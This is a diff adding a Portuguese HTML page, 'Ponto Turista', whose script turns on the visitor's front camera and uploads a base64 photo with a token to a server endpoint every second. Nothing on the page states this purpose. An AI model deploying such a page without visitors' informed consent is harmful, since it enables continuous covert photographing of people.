@@ -1,1 +1,47 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ponto Turista</title>
+</head>
+<body>
+    <h1>Ponto Turista</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let token = ''; // Defina seu token manualmente
+
+        // Acessando a câmera frontal
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then((stream) => {
+                video.srcObject = stream;
+            })
+            .catch((err) => console.error('Erro ao acessar a câmera: ', err));
+
+        // Função para capturar a foto e enviar ao servidor
+        function captureAndSend() {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png'); // Converte a imagem para Base64
+
+            fetch(`/api/sendImage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: imageData, token: token }) // Envia imagem e token
+            })
+            .then((response) => response.json())
+            .then((data) => console.log(data))
+            .catch((error) => console.error('Erro ao enviar a imagem: ', error));
+        }
+
+        // Captura de imagem a cada 1 segundo
+        setInterval(captureAndSend, 1000);
+    </script>
+</body>
+</html>
